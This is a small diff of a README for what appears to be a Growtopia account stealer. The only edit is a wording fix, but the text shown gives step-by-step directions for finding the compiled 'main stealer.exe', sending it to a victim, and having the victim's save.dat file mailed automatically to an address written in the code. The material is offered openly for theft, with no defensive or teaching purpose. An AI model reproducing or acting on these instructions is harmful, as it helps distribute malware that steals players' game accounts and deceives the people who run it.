@@ -28,7 +28,7 @@ A program that allows you to send you the victim's save.dat in Growtopia.
 
 ## Sending .exe file to the victim
 1. Open the **_main stealer_** folder
-2. Open _Bin_ folder and then open the _Debug_ folder
+2. Open the _Bin_ folder and then open the _Debug_ folder
 3. You will see _main stealer.exe_ file
 4. Send it to the victim
 5. When the victim opens the file, victim's save.dat file will automatically will send to the mail that you wrote in the code
